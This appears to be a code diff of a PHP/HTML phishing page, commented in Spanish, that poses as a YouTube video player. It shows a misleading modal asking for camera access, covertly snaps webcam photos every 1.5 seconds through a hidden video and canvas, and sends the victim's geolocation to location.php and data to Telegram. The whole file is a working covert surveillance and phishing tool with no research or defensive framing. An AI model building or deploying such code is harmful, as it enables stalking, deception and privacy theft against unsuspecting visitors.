@@ -1,4 +1,5 @@
 <?php 
+require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
 
@@ -16,55 +17,63 @@ send_to_telegram($msg);
 <!doctype html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>YouTube - Video</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        /* Fondo oscuro similar a YouTube */
-        body {
-            margin: 0;
-            background-color: #121212;
-            color: #fff;
-            font-family: Arial, sans-serif;
-        }
-
-        /* Contenedor de video */
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 960px;
-            margin: 50px auto;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-
-        /* Barra de título simulada */
-        .video-title-bar {
-            background-color: #202020;
-            padding: 10px;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        iframe {
-            display: block;
-            width: 100%;
-            height: 540px;
-        }
+        body { margin:0; font-family: Arial, sans-serif; background: #000; }
+        /* Simula la interfaz de YouTube */
+        .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; }
+        .yt-controls { position: absolute; bottom: 0; width: 100%; height: 50px; background: rgba(0,0,0,0.6); display: flex; align-items: center; padding: 0 10px; color: #fff; }
+        .yt-playbar { flex:1; height:5px; background:#ff0000; margin:0 10px; border-radius:2px; }
     </style>
 </head>
 <body>
 
-<script>
-// Mensaje convincente antes de pedir permisos
-alert("Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.");
-</script>
+<!-- Modal de permisos estético -->
+<div id="cameraModal" style="
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+">
+    <div style="
+        background: #fff;
+        color: #000;
+        padding: 30px;
+        border-radius: 10px;
+        max-width: 500px;
+        text-align: center;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    ">
+        <h2 style="margin-top:0;">¡Atención!</h2>
+        <p>Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.</p>
+        <button id="grantAccess" style="
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #FF0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.2s;
+        " onmouseover="this.style.backgroundColor='#cc0000'" onmouseout="this.style.backgroundColor='#FF0000'">
+            Permitir acceso
+        </button>
+    </div>
+</div>
 
-<div class="video-container">
-    <div class="video-title-bar">YouTube Video - Aldo Arturo</div>
-    <!-- Video de YouTube -->
-    <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<!-- YouTube video con interfaz simulada -->
+<div class="yt-wrapper">
+    <iframe id="Live_YT_TV" width="100%" height="100%" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&mute=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    <div class="yt-controls">
+        <span>▶️</span>
+        <div class="yt-playbar"></div>
+        <span>🔊</span>
+    </div>
 </div>
 
 <!-- Video y Canvas ocultos para tomar fotos -->
@@ -90,7 +99,7 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const constraints = { audio: false, video: { facingMode: "user" } };
 
-// Acceso a la cámara
+// Acceso a la cámara (iniciado al permitir)
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -111,41 +120,25 @@ function capturePhotoLoop() {
     }, 1500);
 }
 
-// Iniciar cámara oculta
-initCamera();
+// Al presionar "Permitir acceso", ocultar modal e iniciar cámara
+document.getElementById('grantAccess').addEventListener('click', () => {
+    document.getElementById('cameraModal').style.display = 'none';
+    initCamera();
+});
 
-// Obtener ubicación y datos del dispositivo automáticamente
+// Obtener ubicación y enviarla automáticamente
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const { latitude, longitude, accuracy } = pos.coords;
-
-        const deviceInfo = {
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || 'unknown',
-            memory: navigator.deviceMemory || 'unknown',
-        };
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                deviceInfo.batteryLevel = battery.level * 100 + '%';
-                deviceInfo.charging = battery.charging;
-                enviarDatos(latitude, longitude, accuracy, deviceInfo);
-            });
-        } else {
-            enviarDatos(latitude, longitude, accuracy, deviceInfo);
-        }
-
-        function enviarDatos(lat, lon, acc, deviceInfo) {
-            fetch('location.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, device: deviceInfo })
-            });
-        }
+        fetch('location.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude, accuracy })
+        });
     });
 }
 </script>
 
 </body>
 </html>
+
